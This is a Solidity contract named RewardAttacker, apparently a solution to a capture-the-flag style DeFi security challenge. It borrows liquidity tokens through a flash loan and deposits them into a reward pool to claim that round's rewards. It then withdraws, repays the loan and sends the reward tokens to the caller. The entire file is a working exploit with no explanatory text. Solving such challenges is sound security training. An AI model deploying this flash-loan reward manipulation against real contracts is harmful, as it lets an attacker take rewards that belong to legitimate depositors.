pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
    function isNewRewardsRound() external view returns (bool);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract RewardAttacker {
    using Address for address payable;

    IFlashLoanerPool lender;
    IRewarderPool rewarder;
    IERC20 lptoken;
    IERC20 rwtoken;

    function receiveFlashLoan(uint256 amount) external {
        lptoken.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        lptoken.transfer(address(lender), amount);
    }

    function attack(IFlashLoanerPool _lender, IRewarderPool _rewarder, IERC20 _lptoken, IERC20 _rwtoken, uint256 amount) external {
        lender = _lender;
        rewarder = _rewarder;
        lptoken = _lptoken;
        rwtoken = _rwtoken;

        lender.flashLoan(amount);

        rwtoken.transfer(msg.sender, rwtoken.balanceOf(address(this)));
    }
}
